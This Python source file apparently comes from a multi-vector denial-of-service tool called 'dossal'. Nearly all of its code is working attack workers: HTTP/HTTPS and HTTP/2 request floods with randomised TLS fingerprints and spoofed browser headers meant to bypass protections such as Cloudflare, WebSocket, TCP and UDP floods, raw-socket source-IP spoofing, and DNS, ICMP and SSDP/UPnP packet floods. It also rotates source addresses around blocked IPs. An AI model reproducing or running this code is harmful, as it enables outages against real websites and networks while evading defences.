    except Exception:
        pass
    ips.add('127.0.0.1')
    return sorted(ips)

def _generate_spoof_ips(count, base_net='203.0.113'):
    """RFC 5737 TEST-NET-3(203.0.113.0/24)에서 N개 스푸핑 IP 생성"""
    import random
    ips = []
    # Use multiple /24 blocks to avoid collision
    for block in range(count // 200 + 1):
        # Each block: 203.0.113.0 - 203.0.113.255 (TEST-NET-3, unclaimed)
        base = f'{base_net}'
        for i in range(min(200, count - len(ips))):
            ip = f'{base}.{i + block * 200 + 1}'
            if ip not in ips:
                ips.append(ip)
    return ips[:count]

def _get_src_ip(proc_idx, total_procs):
    """프로세스별 소스 IP 반환 (라운드 로빈, 차단 IP 제외)"""
    ips = _SRC_IPS[0]
    if not ips:
        return None
    if _RECOVERY[0] and _BLOCKED_IPS:
        # Filter out blocked IPs
        active = [ip for ip in ips if ip not in _BLOCKED_IPS]
        if active:
            return active[proc_idx % len(active)]
    return ips[proc_idx % len(ips)] if ips else None

def _active_ip_count():
    """차단되지 않은 IP 개수 반환"""
    ips = _SRC_IPS[0]
    if not ips:
        return 0
    return sum(1 for ip in ips if ip not in _BLOCKED_IPS)
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived

VERSION = "13.0"

# ── TCP/IP checksum ──────────────────────────────────────────────
def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
    """TCP 헤더 체크섬 계산 (IPv4). int 반환"""
    ihl = 20  # no IP options
    ip_hdr = struct.pack("!4s4sBBHHHBBH4s4s",
        bytes([0]*4), bytes([0]*4),  # dummy IPs (loopback)
        0, 0, 0, 0, 64, 6, 0, src, dst)
    # Actually build proper pseudo-header
    pseudo = struct.pack("!4s4sBBHHHBBH",
        bytes([int(x) for x in src.split('.')]) if isinstance(src, str) else src,
        bytes([int(x) for x in dst.split('.')]) if isinstance(dst, str) else dst,
        0, 6, ihl + len(payload), 0, 0)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 0, 0, 0)
    data = pseudo + tcp_hdr + payload
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

# ── Stats ─────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        """공격 통계 초기화 (요청/바이트/에러/패킷)."""
        self.requests=0; self.bytes=0; self.errors=0; self.opens=0
        self.ws_msgs=0; self.packets=0; self.conns=0
    def rps(self, dur):
        """RPS 계산."""
        return self.requests/dur if dur else 0
    def bps(self, dur):
        """BPS 계산."""
        return self.bytes/dur if dur else 0
    def pps(self, dur):
        """PPS 계산."""
        return self.packets/dur if dur else 0
    def report(self, modes, url, conns, dur):
        """공격 결과 딕셔너리 생성 (JSON 출력용)."""
        d = {
          "tool":"dossal","version":VERSION,"modes":modes,"url":url,
          "connections":conns,"duration_s":dur,
          "requests":self.requests,"rps":round(self.rps(dur),2),
          "bytes":self.bytes,"bps":round(self.bps(dur),2),
          "packets":self.packets,"pps":round(self.pps(dur),2),
          "ws_messages":self.ws_msgs,
          "connections_made":self.conns,
          "errors":self.errors
        }
        return d

# ── URL parsers ───────────────────────────────────────────────────
def parse_http(u):
    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or "/"

def _host_port(u):
    """URL에서 (호스트, 포트) 추출. http/https/udp/tcp 등 모든 스키미 지원."""
    if '://' not in u:
        parts = u.rsplit(':', 1)
        if len(parts) == 2:
            return parts[0], int(parts[1])
        return u, 80
    p = urlparse(u)
    port = p.port
    if port is None:
        # No port in URL: use scheme default
        port = 443 if p.scheme in ('https', 'wss') else 80
    return p.hostname or '127.0.0.1', int(port)

def parse_http(u):
    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or '/'

def parse_tcp(u):
    """tcp:// URL을 (호스트, 포트)로 파싱"""
    return _host_port(u)

def parse_udp(u):
    """udp:// URL을 (호스트, 포트)로 파싱"""
    return _host_port(u)

def parse_ws(u):
    """ws:// 또는 wss:// URL 파싱."""
    from urllib.parse import urlparse
    host, port = _host_port(u)
    p = urlparse(u)
    if p.scheme == 'wss':
        port = 443 if not p.port else p.port
    else:
        port = 80 if not p.port else p.port
    return host, port, p.path or "/"

def parse_ip_port(u):
    """IP:포트를 파싱. (호스트, 포트) 반환"""
    return _host_port(u)

# ── HTTP response reader ──────────────────────────────────────────
async def _read_http_response(reader):
    """HTTP 응답을 Content-Length 기반으로 전체 읽기"""
    header_data = b''
    while b'\r\n\r\n' not in header_data:
        try:
            chunk = await asyncio.wait_for(reader.read(1024), timeout=5.0)
        except asyncio.TimeoutError:
            return b''
        if not chunk:
            return b''
        header_data += chunk
    header_end = header_data.find(b'\r\n\r\n')
    headers_part = header_data[:header_end].decode('latin1')
    body_start = header_end + 4
    body = header_data[body_start:]
    for line in headers_part.split('\r\n'):
        if line.lower().startswith('content-length:'):
            content_length = int(line.split(':', 1)[1].strip())
            while len(body) < content_length:
                try:
                    chunk = await asyncio.wait_for(reader.read(8192), timeout=5.0)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                body += chunk
            body = body[:content_length]
            break
    return header_data[:body_start] + body

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════

async def http_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTP L7 공격 워커: asyncio 기반 HTTP 요청 폭주"""
    host, port, path = parse_http(url)
    reader, writer = await asyncio.open_connection(host, port)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()

    while not stop.is_set():
        try:
            async def _write_read():
                """요청 쓰기 + 응답 읽기 (동시)."""
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

def _make_tls_ctx(proc_idx):
    """TLS 컨텍스트 생성 (fingerprint 랜덤화: cipher/ALPN/SNI 변동)"""
    import ssl as _ssl
    import random as _rnd
    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    
    # Randomize cipher list (order matters for JA3)
    ciphers = [
        'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
        'DHE-RSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256', 'DHE-RSA-AES128-GCM-SHA256',
    ]
    # Shuffle a random subset
    _rnd.shuffle(ciphers)
    subset = ciphers[:_rnd.randint(4, 10)]
    try:
        ctx.set_ciphers(':'.join(subset))
    except Exception:
        pass
    
    # Randomize ALPN
    alpn_options = [
        ['h2', 'http/1.1'],
        ['http/1.1'],
        ['h2'],
        [],
    ]
    alpn = _rnd.choice(alpn_options)
    if alpn:
        try:
            ctx.set_alpn_protocols(alpn)
        except Exception:
            pass
    
    # Randomize minimum TLS version
    min_tls_options = [_ssl.TLSVersion.TLSv1_2, _ssl.TLSVersion.TLSv1_3]
    if _rnd.random() < 0.7:
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
    else:
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_3
    
    return ctx

def _mp_https_flood(args_tuple):
    """멀티프로세스 HTTPS 전송 (TLS 1.3 0-RTT + fingerprint 랜덤화)"""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    import random as _rnd
    if len(args_tuple) == 5:
        host, port, path, duration, proc_idx = args_tuple
    else:
        host, port, path, duration = args_tuple
        proc_idx = 0
    sent = 0
    errors = 0
    # First connection: full TLS handshake, cache session for 0-RTT
    ssock = None
    cached_session = None
    ctx = None
    for attempt in range(3):
        try:
            ctx = _make_tls_ctx(proc_idx + attempt * 100)
            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            raw.settimeout(5.0)
            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
            raw.connect((host, port))
            # Random SNI (sometimes use IP, sometimes hostname)
            sni = host if _rnd.random() < 0.8 else None
            ssock = ctx.wrap_socket(raw, server_hostname=sni)
            # Cache session for 0-RTT reuse
            try:
                cached_session = ssock.session
            except Exception:
                pass
            break
        except Exception:
            try:
                raw.close()
            except Exception:
                pass
            _time.sleep(0.3)
    if ssock is None:
        return 0, 1
    
    # Use randomized HTTP request
    req = _random_http_req(host, path)
    req_counter = 0
    
    def _reconnect_0rtt():
        """캐시된 TLS 세션으로 재연결 (0-RTT early data)."""
        nonlocal ssock, sent
        try:
            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            raw.settimeout(3.0)
            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
            raw.connect((host, port))
            ssock = ctx.wrap_socket(raw, server_hostname=host)
            # Load cached session for 0-RTT
            if cached_session is not None:
                try:
                    ssock.session = cached_session
                except Exception:
                    pass
            return True
        except Exception:
            return False
    
    end = _time.time() + duration
    while _time.time() < end:
        try:
            req_counter += 1
            if req_counter % 500 == 0:
                req = _random_http_req(host, path)
            if _JITTER[0] > 0:
                import random as _rj
                _time.sleep(_rj.uniform(0, _JITTER[0]))
            _t_send = _time.time()
            ssock.sendall(req)
            data = ssock.recv(65535)
            _t_recv = _time.time()
            if not data:
                break
            sent += 1
            # v8.1/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
            if _ADAPTIVE[0]:
                _resp_ms = (_t_recv - _t_send) * 1000.0
                _adaptive_adjust(_resp_ms, _t_recv)
                # v8.2: rps_mult로 실제 sleep
                _mult = _ADAPTIVE_STATE['rps_mult']
                if _mult < 0.95:
                    _sleep_time = (1.0 / _mult - 1.0) * 0.001
                    _time.sleep(min(_sleep_time, 0.5))
        except Exception:
            # Reconnect with 0-RTT if session cached
            if cached_session is not None:
                if not _reconnect_0rtt():
                    break
            else:
                break
    try:
        ssock.close()
    except Exception:
        pass
    return sent, errors

async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTPS 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 TLS 연결"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    # Each process gets a unique index for TLS fingerprint variation
    targets = [(host, port, path, duration, i) for i in range(n_procs)]
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_https_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def https_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTPS L7 공격 워커: TLS + HTTP 요청 폭주 (v5.1: 브라우저 지문 스푸핑)"""
    host, port, path = parse_http(url)
    # v5.1: 브라우저 TLS 지문 (cipher 순서 + ALPN)
    ctx = _browser_ssl_context(_BROWSER[0], server_hostname=host)
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    # v5.1: 브라우저 HTTP 헤더 (Cache Bypass 포함)
    import random as _rs2
    import time as _t2
    if _CACHE_BYPASS[0]:
        salt = int(_t2.time() * 1000) + _rs2.randint(0, 99999)
        req_path = f"{path}?_cb={salt}&r={_rs2.randint(100000, 999999)}"
    else:
        req_path = path
    _h, _ = _spoofed_http_headers(host, req_path, _BROWSER[0])
    req = (f"GET {req_path} HTTP/1.1\r\n" + "\r\n".join(_h) + "\r\n\r\n")
    req_bytes = req.encode()
    while not stop.is_set():
        if _JITTER[0] > 0:
            import random as _rj
            await asyncio.sleep(_rj.uniform(0, _JITTER[0]))
        try:
            async def _write_read():
                """요청 쓰기 + 응답 읽기 (https/http worker)."""
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            # v12.9: stop 후(지정 시간 종료)의 예외는 정규 종료 — 에러로 세지 않음
            if not stop.is_set():
                stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

async def ws_worker(name, url, stats, duration, stop, payload_size=128):
    """WebSocket 공격 워커: WS 연결 유지 + 메시지 폭주"""
    host, port, path = parse_ws(url)
    reader, writer = await asyncio.open_connection(host, port)
    key = base64.b64encode(random.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\n\r\n")
    writer.write(req.encode()); await writer.drain()
    try:
        handshake = await asyncio.wait_for(reader.read(8192), timeout=0.5)
    except asyncio.TimeoutError:
        stats.errors += 1
        writer.close()
        return
    if b"101" not in handshake:
        stats.errors += 1
        writer.close(); return
    stats.conns += 1
    payload = b"x" * payload_size
    import time as _time
    _ws_start = _time.time()
    while not stop.is_set():
        if _time.time() - _ws_start > duration:
            break
        try:
            mask = random.randbytes(4)
            masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            header = struct.pack("!B", 0x81)
            if len(payload) < 126:
                header += struct.pack("!B", 0x80 | len(payload))
            else:
                header += struct.pack("!BH", 0x80 | 126, len(payload))
            header += mask
            writer.write(header + masked)
            await asyncio.wait_for(writer.drain(), timeout=0.1)
            stats.ws_msgs += 1
            stats.bytes += len(header) + len(masked)
        except asyncio.TimeoutError:
            break
        except Exception:
            stats.errors += 1
            break
    try:
        writer.transport.set_write_buffer_limits(high=65536)
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
    except Exception:
        pass

def _mp_tcp_flood(args_tuple):
    """멀티프로세스 TCP 바이트 패킷: 연결 후 반복 전송."""
    host, port, duration, payload_size = args_tuple
    import time as _time
    payload = b"A" * payload_size
    bytes_sent = 0
    pkts = 0
    errors = 0
    end = _time.time() + duration
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        while _time.time() < end:
            try:
                s.send(payload)
                bytes_sent += len(payload)
                pkts += 1
            except Exception:
                break
        s.close()
    except Exception:
        errors += 1
    return bytes_sent, pkts, errors

async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
    """TCP L4 공격 워커: 반복 TCP 연결 폭주"""
    host, port = parse_tcp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))  # TCP uses same proc count
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_tcp_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0)] * n_procs
    stats.conns += n_procs
    for bytes_sent, pkts, errors in results:
        stats.bytes += bytes_sent
        stats.packets += pkts
        stats.errors += errors

_UDP_NPROCS = [4]  # mutable list to allow global override

def _mp_udp_send(args_tuple):
    """멀티프로세스 UDP 패킷 전송"""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b"B" * payload_size
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

def _mp_udp_spoof(args_tuple):
    """멀티프로세스 UDP 송신 (소스 IP 바인딩).
    각 프로세스는 풀에서 다른 소스 IP에 바인딩.
    Windows(관리자): raw socket + IP_HDRINCL로 진짜 스푸핑.
    macOS/Linux: SOCK_DGRAM + bind()로 로컬 IP."""
    import time as _time
    import struct as _struct
    host, port, duration, payload_size, src_ip = args_tuple
    
    if _IS_WINDOWS:
        # Windows: raw socket + IP_HDRINCL (true IP spoofing)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            
            # Build IP header with spoofed source IP
            src_bytes = socket.inet_aton(src_ip) if src_ip else socket.inet_aton('0.0.0.0')
            dst_bytes = socket.inet_aton(host)
            udp_len = 8 + payload_size
            total_len = 20 + udp_len
            
            # IP header: version/ihl, tos, total_len, id, flags/frag, ttl, proto, checksum, src, dst
            ip_header = _struct.pack('!BBHHHBBH4s4s',
                0x45, 0, total_len, 0, 0, 64, 17, 0,
                src_bytes, dst_bytes)
            
            # UDP header: src_port, dst_port, length, checksum
            udp_header = _struct.pack('!HHHH', 54321, port, udp_len, 0)
            payload = b"B" * payload_size
            full_packet = ip_header + udp_header + payload
            
            sent = 0
            end = _time.time() + duration
            while _time.time() < end:
                n = 2000
                try:
                    for _ in range(n):
                        sock.sendto(full_packet, (host, port))
                    sent += n
                except Exception:
                    break
            sock.close()
            return sent
        except (OSError, PermissionError):
            # Fallback to SOCK_DGRAM if raw socket fails (non-admin)
            pass
    
    # macOS/Linux or fallback: SOCK_DGRAM + bind
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    
    if src_ip and src_ip != '0.0.0.0':
        try:
            sock.bind((src_ip, 0))
        except OSError:
            sock.bind(('0.0.0.0', 0))
    
    payload = b"B" * payload_size
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
    """UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    # Spawn N child processes
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    
    if _SPOOF_MODE[0] and _SRC_IPS[0]:
        # IP spoofing mode: each process uses a different spoofed source IP
        targets = []
        for i in range(n_procs):
            src_ip = _get_src_ip(i, n_procs)
            if src_ip:
                targets.append((host, port, duration, payload_size, src_ip))
        if targets:
            pool = ctx.Pool(len(targets))
            async_result = pool.map_async(_mp_udp_spoof, targets)
            results = await _wait_pool(pool, async_result, duration + 15)
            if results is None:
                results = [0] * len(targets)
            total = sum(results) if isinstance(results, list) else results
            stats.packets += total
            stats.bytes += total * payload_size
            print(f"[spoof] UDP: {total} packets sent from {len(targets)} spoofed IPs", file=sys.stderr)
            return
    
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_udp_send, targets)
    
    # Wait for completion
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * payload_size

async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
    """HTTP/2 (h2) 공격 워커: ALPN 협상 + H2 스트림 폭주 (v5.1: 브라우저 TLS 지문)"""
    host, port, path = parse_http(url)
    # v5.1: 브라우저 TLS cipher 순서 + ALPN h2
    _h2_ctx = __import__('ssl').SSLContext(__import__('ssl').PROTOCOL_TLS_CLIENT)
    _h2_ctx.check_hostname = False
    _h2_ctx.verify_mode = __import__('ssl').CERT_NONE
    _p = _BROWSER_PROFILES.get(_BROWSER[0], _BROWSER_PROFILES['chrome'])
    try:
        _h2_ctx.set_ciphers(':'.join(f'{c:04X}' for c in _p['ciphers']))
    except Exception:
        pass
    _h2_ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=_h2_ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    # Header pool for H2 (CF bypass: sec-fetch-*, sec-ch-ua)
    import random as _rnd
    def _h2_headers():
        """H2 헤더 생성 (UA/headers 랜덤)."""
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        ]
        paths = [path, '/', '/index.html', '/api', '/static/app.js', '/favicon.ico']
        return [
            (':method', 'GET'),
            (':scheme', 'https'),
            (':authority', host),
            (':path', _rnd.choice(paths)),
            ('user-agent', _rnd.choice(uas)),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            ('accept-language', _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9'])),
            ('sec-fetch-dest', 'document'),
            ('sec-fetch-mode', 'navigate'),
            ('sec-fetch-site', 'none'),
            ('sec-fetch-user', '?1'),
            ('upgrade-insecure-requests', '1'),
        ]
    
    # Batched h2: send N requests, then drain responses
    import os as _os
    BATCH = int(_os.environ.get('DOSSAL_H2_BATCH', '32'))
    error = None
    h2_429 = 0
    while not stop.is_set():
        if _JITTER[0] > 0:
            import random as _rj
            await asyncio.sleep(_rj.uniform(0, _JITTER[0]))
        try:
            # Randomize headers per batch
            batch_headers = _h2_headers()
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, batch_headers, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            # Drain available responses (non-blocking read)
            deadline = time.time() + 1.0
            while time.time() < deadline:
                try:
                    chunk = await asyncio.wait_for(reader.read(65535), timeout=0.05)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                for event in events:
                    if isinstance(event, DataReceived):
                        stats.bytes += len(event.data)
                    elif isinstance(event, ResponseReceived):
                        # h2 headers are list of (name, value) tuples
                        for hname, hval in event.headers:
                            if hname == ':status' and hval == '429':
                                h2_429 += 1
                                break
        except Exception as e:
            error = e
            # v12.9: stop 후(지정 시간 종료)의 예외는 정규 종료 — 에러로 세지 않음
            # (ConnectionResetError 등: 공격 종료와 동시에 서버가 RST gönder는 것)
            if not stop.is_set():
                stats.errors += 1
                print(f"[h2-worker] error: {type(e).__name__}: {e}", file=sys.stderr)
            break
    if h2_429 > 0:
        print(f"[h2] {h2_429} 429 responses received", file=sys.stderr)
    if writer.transport:
        writer.transport.abort()

# ── DNS flood: UDP DNS query flood ──────────────────────────────
def _mp_dns_flood(args_tuple):
    """멀티프로세스 DNS 쿼리 패킷: 스푸핑 소스 IP + 랜덤 도메인."""
    import time as _time
    import random as _rnd
    import struct as _struct
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # Random domain names
    domains = ['example.com', 'google.com', 'cloudflare.com', 'test.org', 'domain.net',
               'a.b.c.d', 'sub.domain.com', 'api.service.io', 'cdn.assets.com', 'mail.server.net']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                # DNS query: header (12 bytes) + question
                # Header: ID, flags(0x0100=RD), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
                query_id = _rnd.randint(0, 65535)
                domain = _rnd.choice(domains)
                # Encode domain name
                qname = b''
                for label in domain.split('.'):
                    qname += bytes([len(label)]) + label.encode()
                qname += b'\x00'
                # Question: qname + QTYPE(1=A) + QCLASS(1=IN)
                question = qname + _struct.pack('!HH', 1, 1)
                dns_packet = _struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0) + question
                sock.sendto(dns_packet, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def dns_worker(name, url, stats, duration, stop, payload_size=0):
    """DNS amplification 워커: UDP DNS 쿼리 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_dns_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 60  # avg DNS query size

# ── ICMP flood: ping flood ──────────────────────────────────────
def _mp_icmp_flood(args_tuple):
    """멀티프로세스 ICMP ping 패킷."""
    import time as _time
    import struct as _struct
    import os
    host, port, duration = args_tuple
    # ICMP raw socket (needs root/admin on most systems)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except PermissionError:
        # Fallback: use UDP to simulate (less effective)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # ICMP echo request: type=8, code=0, checksum, id, seq, payload
    pid = os.getpid() & 0xFFFF
    payload = b'dossal-icmp-ping-payload-' * 8  # 256 bytes
    sent = 0
    end = _time.time() + duration
    seq = 0
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                seq = (seq + 1) & 0xFFFF
                # ICMP header: type(8), code(0), checksum(0), id, seq
                icmp_hdr = _struct.pack('!BBHHH', 8, 0, 0, pid, seq)
                packet = icmp_hdr + payload
                # Calculate ICMP checksum
                if len(packet) % 2:
                    packet += b'\x00'
                s = 0
                for i in range(0, len(packet), 2):
                    w = (packet[i] << 8) + packet[i+1]
                    s += w
                s = (s >> 16) + (s & 0xFFFF)
                s += s >> 16
                checksum = ~s & 0xFFFF
                packet = _struct.pack('!BBHHH', 8, 0, checksum, pid, seq) + payload
                try:
                    if sock.type == socket.SOCK_RAW:
                        sock.sendto(packet, (host, 0))
                    else:
                        sock.sendto(packet, (host, 7))  # port 7 for UDP fallback
                except Exception:
                    pass
                sent += 1
        except Exception:
            break
    sock.close()
    return sent

async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
    """ICMP flood 워커: UDP로 ICMP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_icmp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 276  # avg ICMP packet size

# ── SSDP/UPnP flood: M-SEARCH flood (UDP 1900) ──────────────────
def _mp_ssdp_flood(args_tuple):
    """멀티프로세스 SSDP M-SEARCH 패킷: IoT/UPnP 타겟."""
    import time as _time
    import random as _rnd
    host, port, duration = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    
    # SSDP M-SEARCH requests
    st_types = ['ssdp:all', 'upnp:rootdevice', 'urn:schemas-upnp-org:device:basic:1',
                'urn:schemas-upnp-org:service:WANIPConnection:1',
                'urn:ietf:params:ssdp:v1']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                st = _rnd.choice(st_types)
                mx = _rnd.randint(1, 30)
                ssdp_req = (f"M-SEARCH * HTTP/1.1\r\n"
                           f"HOST: 239.255.255.250:1900\r\n"
                           f"MAN: \"ssdp:discover\"\r\n"
                           f"MX: {mx}\r\n"
                           f"ST: {st}\r\n\r\n").encode()
                sock.sendto(ssdp_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def ssdp_worker(name, url, stats, duration, stop, payload_size=0):
    """SSDP/UPnP flood 워커: UDP M-SEARCH 폭주 (IoT 타격)"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ssdp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 150

